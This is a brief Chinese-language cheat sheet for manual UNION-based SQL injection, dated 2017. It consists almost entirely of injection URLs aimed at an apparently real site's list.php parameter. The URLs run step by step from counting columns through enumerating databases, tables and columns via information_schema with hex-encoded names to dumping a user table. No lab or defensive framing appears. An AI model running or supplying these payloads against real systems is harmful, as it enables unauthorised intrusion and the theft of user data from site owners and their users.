# sql注入---union手注

```
确定表中字段数（假设是3）
http://www.hunyinshe.com/list.php?id=1 order by 2  -- - 
--------------------------------------------------------------------------------

当前数据库名
http://www.hunyinshe.com/list.php?id=1 and 1=2 union select 1,database(),3 -- -
--------------------------------------------------------------------------------

所有数据库名
http://www.hunyinshe.com/list.php?id=1 and 1=2 union select 1,SCHEMA_NAME,3 from information_schema.SCHEMATA -- - 
--------------------------------------------------------------------------------

所有表名
http://www.hunyinshe.com/list.php?id=1 and 1=2 union select 1,table_name,3 from information_schema.tables -- - 
--------------------------------------------------------------------------------

查数据库名为：xjdj的所有表名：
http://www.hunyinshe.com/list.php?id=1 and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema= 0x786a646a -- - 
（Ps:其中 0x786a646a是“xjdj”的HEX编码）
--------------------------------------------------------------------------------

查数据库为xjdj的cmsdj_user的字段名：
http://www.hunyinshe.com/list.php?id=1 and 1=2 union select 1,COLUMN_NAME,3 from Information_schema.columns where table_Name = 0x636d73646a5f75736572 and TABLE_SCHEMA=0x786a646a -- -
--------------------------------------------------------------------------------

查数据库为xjdj的cmsdj_user的字段名cd_name的数据：
http://www.hunyinshe.com/list.php?id=1 and 1=2 union select 1,字段名,3  from 数据库名.表名 -- -
```


2017/9/2  
